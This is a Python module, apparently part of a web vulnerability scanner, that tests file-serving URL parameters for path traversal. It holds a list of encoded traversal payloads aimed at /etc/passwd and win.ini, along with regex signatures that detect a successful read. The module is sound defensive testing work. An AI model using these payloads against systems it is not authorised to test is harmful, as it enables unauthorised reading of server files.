"""Path traversal check — directory traversal via file-serving parameters."""

from __future__ import annotations

import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

from .base import BaseCheck, FindingDraft
from ....utils.evidence import format_request, format_response

# Parameters that commonly serve files
_FILE_PARAMS = {
    "file", "path", "page", "doc", "document", "include",
    "template", "view", "load", "read", "download", "filename",
    "filepath", "dir", "folder", "img", "image", "src", "source",
    "resource", "asset", "conf", "config",
}

_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/../../../etc/passwd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "..\\..\\..\\Windows\\win.ini",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini",
]

# Patterns indicating successful file read
_UNIX_SIGNATURES = [
    r"root:.*:0:0:",          # /etc/passwd
    r"\[boot loader\]",       # win.ini
    r"\[extensions\]",        # win.ini
    r"for 16-bit app support",
]


def _looks_like_success(body: str) -> bool:
    return any(re.search(pat, body, re.I) for pat in _UNIX_SIGNATURES)


def _has_file_param(params: list[str]) -> list[str]:
    return [p for p in params if p.lower() in _FILE_PARAMS]


class PathTraversalCheck(BaseCheck):
    name = "path_traversal"
    description = "Test file-serving parameters for directory traversal"
    vuln_class = "Path Traversal"
    references = [
        "https://owasp.org/www-community/attacks/Path_Traversal",
        "https://cwe.mitre.org/data/definitions/22.html",
    ]
    applicable_categories = ["injection", "configuration", "info_disclosure"]

    async def run(self, vector, client: httpx.AsyncClient, ai=None) -> list[FindingDraft]:
        findings: list[FindingDraft] = []
        url = vector.url
        params = vector.parameters

        file_params = _has_file_param(params)
        if not file_params:
            return []

        parsed = urlparse(url)

        for param in file_params:
            for payload in _TRAVERSAL_PAYLOADS:
                qs = parse_qs(parsed.query)
                qs[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

                try:
                    req = client.build_request("GET", test_url)
                    resp = await client.send(req)
                except Exception:
                    continue

                if resp.status_code == 200 and _looks_like_success(resp.text):
                    raw_req = format_request(req)
                    raw_resp = format_response(resp)

                    findings.append(FindingDraft(
                        title=f"Path Traversal in `{param}` at {parsed.netloc}{parsed.path}",
                        vuln_class=self.vuln_class,
                        severity="high",
                        url=url,
                        parameter=param,
                        description=(
                            f"Parameter `{param}` is vulnerable to path traversal. "
                            f"Payload `{payload}` returned file system content."
                        ),
                        evidence=f"Payload: {payload}\nResponse snippet:\n{resp.text[:300]}",
                        raw_request=raw_req,
                        raw_response=raw_resp,
                        references=self.references,
                    ))
                    break  # One finding per param

        return findings
